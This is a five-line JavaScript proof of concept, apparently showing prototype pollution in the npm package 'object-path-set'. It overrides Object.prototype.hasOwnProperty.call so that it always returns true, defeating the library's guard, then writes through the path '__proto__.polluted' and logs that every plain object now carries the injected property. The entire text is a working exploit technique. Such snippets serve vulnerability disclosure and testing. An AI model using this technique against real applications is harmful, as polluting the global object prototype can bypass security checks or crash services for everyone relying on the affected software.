Object.prototype.hasOwnProperty.call = () => true;
const setPath = require('object-path-set');
console.log({}.polluted);
setPath({}, '__proto__.polluted', 'yes');
console.log({}.polluted);